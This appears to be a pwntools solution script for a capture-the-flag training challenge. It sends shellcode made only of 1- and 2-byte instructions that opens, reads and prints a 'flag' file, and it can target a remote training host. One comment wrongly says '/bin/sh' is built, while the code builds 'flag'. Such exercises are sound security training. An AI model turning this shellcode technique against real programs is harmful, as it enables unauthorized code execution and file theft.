from pwn import *

# asks for an input and executes it, but instructions must be at most 2 bytes long each

# the * before the address means to gdb "address" (duh) instead of "symbol" (like the main function)
COMMANDS = """
b  *0x0401b9e
c
"""
context.arch = "amd64"

if args.REMOTE:
    c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./tiny", gdbscript = COMMANDS)
    else:
        c = process("./tiny")

#input("Wait")
c.recvuntil(b"Can you pop a shell with a shellcode made of 1 or 2 bytes instructions?\n > ")

#done with open, read and write syscalls (where it wasn't possible to reduce mov Rxy, Rab I inserted push Rab and pop Rxy)
#To use only 2-byte instruction I used shl to insert "/bin/sh" to a register
shellcode = """
xor ebx, ebx
mov bl, 0x67
"""

for i in range(8):
    shellcode += "shl ebx\n"
    
shellcode += "mov bl, 0x61\n"

for i in range(8):
    shellcode += "shl ebx\n"
    
shellcode += "mov bl, 0x6c\n"

for i in range(8):
    shellcode += "shl ebx\n"
    
shellcode += """mov bl, 0x66
xor eax, eax
mov al, 2
push rbx
push rsp
pop rdi
xor edx, edx
xor esi, esi
syscall
push rax
pop rdi
xor eax, eax
mov dl, 0xff
push rsp
pop rsi
syscall
xor eax, eax
mov al, 1
xor ebx, ebx
mov bl, 1
mov edi, ebx
syscall
"""

shellcode_c = asm(shellcode)
c.send(shellcode_c)
c.interactive()